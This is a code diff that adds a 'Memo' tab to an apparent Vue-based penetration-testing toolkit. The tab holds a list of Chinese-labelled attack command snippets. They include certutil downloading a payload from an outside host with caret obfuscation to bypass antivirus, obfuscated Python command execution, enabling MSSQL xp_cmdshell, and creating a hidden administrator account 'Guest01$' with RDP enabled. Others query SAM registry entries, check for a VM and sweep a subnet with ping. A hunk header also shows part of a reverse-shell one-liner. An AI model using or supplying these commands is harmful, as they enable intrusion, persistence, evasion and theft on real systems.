@@ -44,6 +44,16 @@
                     style="width: 80%; margin-left: 10px;"></el-input>
             </div>
         </el-tab-pane>
+        <el-tab-pane label="Memo">
+            <div style="display: flex;">
+                <el-table :data="memo" border highlight-current-row :show-header="false" @current-change="handleChange"
+                    style="width: 35%; height: 65vh;">
+                    <el-table-column prop="label" @current-change="handleChange" />
+                </el-table>
+                <el-input v-model="reverse.show" type="textarea" rows="20" resize="none"
+                    style="width: 80%; margin-left: 10px;"></el-input>
+            </div>
+        </el-tab-pane>
     </el-tabs>
 </template>
   
@@ -171,7 +181,63 @@ while True: d=c.recv(1024).decode();p=sp.Popen(d,shell=True,stdout=sp.PIPE,stder
     ]
 })
 
+const memo = [
+    {
+        label: "Windows下载文件",
+        value: `certutil -urlcache -split -f http://xxx.cn/test.txt
 
+(绕过杀软) start cert^u^t^il -url""""cache -sp""""lit -f http://x.x.x.x:8080/payload.ps1`
+    },
+    {
+        label: "Python动态导入RCE",
+        value: `import importlib
+
+# 拼接字符串为模块名
+module_name = "o" + "s"
+
+# 动态导入模块
+ss = importlib.import_module(module_name)
+# 执行os模块的操作
+ss.system("whoami")`
+    },
+    {
+        label: "Mssql执行命令",
+        value: `EXEC sp_configure 'show advanced options', 1;RECONFIGURE;EXEC sp_configure 'xp_cmdshell', 1;RECONFIGURE;exec master..xp_cmdshell 'whoami';`
+    },
+    {
+        label: "显示系统中曾经连过WIFI密码",
+        value: `netsh wlan show profiles`
+    },
+    {
+        label: "检查系统是否为Vmware",
+        value: `wmic bios list full | find /i "vmware"`
+    },
+    {
+        label: "Windows查看计划任务",
+        value: `schtasks /QUERY /fo LIST /v`
+    },
+    {
+        label: "Windows添加用户&开启RDP",
+        value: `添加用户并添加到管理员组
+net user Guest01$ Aa123456. /add
+net localgroup Administrators Guest01$ /add
+
+开启3389
+REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal" "Server /v fDenyTSConnections /t REG_DWORD /d 00000000 /f`
+    },
+    {
+        label: "Windows注册表查用户",
+        value: `reg query HKEY_LOCAL_MACHINE\SAM\SAM\Domains\Account\Users\Names`
+    },
+    {
+        label: "Windows查文件",
+        value: `dir c:\ /s /b | find "win.ini"`
+    },
+    {
+        label: "Linux Ping探活",
+        value: `for i in 192.168.0.{1..254}; do if ping -c 3 -w 3 $i &>/dev/null; then echo $i is alived; fi; done`
+    },
+]
 
 function handleChange(row: any) {
     reverse.show = row.value;
